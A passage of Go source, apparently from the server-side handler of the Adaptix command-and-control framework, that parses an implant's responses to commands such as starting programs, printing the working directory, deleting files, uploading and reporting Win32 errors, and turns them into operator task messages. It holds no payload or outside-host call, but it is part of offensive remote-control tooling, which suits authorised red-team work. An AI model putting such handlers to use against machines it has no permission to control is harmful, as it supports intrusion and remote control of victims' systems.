			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}
			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			Ts.TsClientGuiFilesStatus(task)

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
			task.MessageType = adaptix.MESSAGE_ERROR

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:
	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}
	return nil
}
